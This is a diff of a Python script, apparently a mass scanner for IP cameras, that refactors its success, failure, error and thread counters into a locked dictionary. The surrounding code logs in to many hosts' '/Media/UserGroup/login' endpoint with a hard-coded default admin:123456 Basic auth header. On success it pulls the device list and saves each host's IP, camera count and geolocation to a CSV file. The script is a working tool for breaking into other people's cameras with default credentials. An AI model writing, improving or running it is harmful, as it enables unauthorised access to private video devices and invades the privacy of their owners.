@@ -7,11 +7,15 @@ import math
 
 
 request_count = 0
-success = 0
-failed = 0
-errors = 0
-threads = 0
 mutex_list = {}
+
+counter_mutex = {}
+counter = {
+    "success": 0,
+    "failed": 0,
+    "errors": 0,
+    "threads": 0,
+}
 
 with open('output.csv', 'w') as f:
     f.writelines("ip,port,status_code,camera count,source,city,country,country_code,longitude,latitude\n")
@@ -31,32 +35,21 @@ def add_mutex(name):
     return decorator
 
 
-@add_mutex("threads")
-def change_thread_count(change):
-    global threads
-    threads = threads + change
+def change_value(value, change=1):
+    if not value in counter_mutex:
+        counter_mutex[value] = threading.Lock()
 
-@add_mutex("success")
-def add_success():
-    global success
-    success += 1
+    @add_mutex(value)
+    def wrapper(value, change):
+        counter[value] += change
 
-@add_mutex("failed")
-def add_failed():
-    global failed
-    failed += 1
-
-@add_mutex("error")
-def add_error():
-    global errors
-    errors += 1
-
+    return wrapper(value, change)
 
 @add_mutex("print_single")
 def print_single(server, status=False):
     if status:
-        add_success()
-    print(f"[ \033[92m{success} \033[97m| \033[33m{failed} \033[97m| \033[91m{errors} \033[97m] http://\033[96m{server}\033[97m/")
+        change_value("success")
+    print(f"[ \033[92m{counter['success']} \033[97m| \033[33m{counter['failed']} \033[97m| \033[91m{counter['errors']} \033[97m] http://\033[96m{server}\033[97m/")
 
 
 @add_mutex("save")
@@ -69,9 +62,7 @@ def send_login_request(server, source, city, country, country_code, long, lat):
     global success, failed, request_count
     try:
         r = requests.get(f"http://{server}/Media/UserGroup/login?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)
-
         if r.status_code == 200:
-
             count = "N/A"
             try:
                 r = requests.get(f"http://{server}/Media/Device/getDevice?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)
@@ -83,20 +74,20 @@ def send_login_request(server, source, city, country, country_code, long, lat):
             print_single(server, True)
             save(server, r.status_code, count, source, city, country, country_code, long, lat)
         else:
-            add_failed()
+            change_value("failed")
 
     except Exception:
-        add_error()
+        change_value("errors")
 
     finally:
-        change_thread_count(-1)
+        change_value("threads", -1)
 
 
 
 def start_thread(*args):
-    while threads >= config.MAX_THREADS:
+    while counter['threads'] >= config.MAX_THREADS:
         pass
-    change_thread_count(1)
+    change_value("threads")
     threading.Thread(target=send_login_request, args=(*args,)).start()
 
 print("\033[92msuccess\t\033[33mfailure\t\033[91merror")
